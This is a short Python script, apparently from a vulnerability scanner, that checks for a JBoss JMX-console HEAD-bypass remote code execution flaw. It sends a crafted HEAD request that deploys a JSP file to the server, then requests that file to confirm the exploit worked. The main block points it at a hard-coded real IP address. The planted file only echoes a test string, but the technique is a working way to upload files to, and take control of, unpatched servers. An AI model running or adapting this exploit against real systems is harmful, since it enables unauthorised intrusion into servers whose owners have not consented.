# coding:utf-8

import requests
import socket
import time
import random

def random_str(len):
    str1 = ""
    for i in range(len):
        str1 += (random.choice("ABCDEFGH"))
    return str1

def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    print('testing if jboss head bypass remote code exec vul')
    try:
        socket.setdefaulttimeout(7)
        s1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s1.connect((ip, int(port)))
        shell = "xunfengtest"
        shellcode = ""
        name = random_str(5)
        for v in shell:
            shellcode += hex(ord(v)).replace("0x", "%")
        flag = "HEAD /jmx-console/HtmlAdaptor?action=invokeOpByName&name=jboss.admin%3Aservice%3DDeploymentFileRepository&methodName=store&argType=" + \
               "java.lang.String&arg0=%s.war&argType=java.lang.String&arg1=xunfeng&argType=java.lang.String&arg2=.jsp&argType=java.lang.String&arg3=" % (name) + shellcode + \
               "&argType=boolean&arg4=True HTTP/1.0\r\n\r\n"
        flag = flag.encode(encoding='utf-8')
        s1.send(flag)
        data = s1.recv(512)
        s1.close()
        time.sleep(5)
        webshell_url = "%s/%s/xunfeng.jsp" % (url, name)
        res = requests.get(url = webshell_url, verify=False,timeout=5)
        print(res.text)
        if res.text == 'xunfengtest' and res.status_code == 200:
            msg = 'There is jboss head bypass remote code exec vul on url: ' +webshell_url+ ' .'
            number = 'v83'
            print(msg)
            return True,url,number,msg
        else:
            pass
    except Exception as e:
        msg = str(e)
        number = 'v0'
        return False,url,number,msg
    msg = 'There is no jboss head bypass remote code exec vul on url'
    number = 'v0'
    return False,url,number,msg

if __name__ == '__main__':
    res = verify('http','223.202.25.77',80)
    print(res)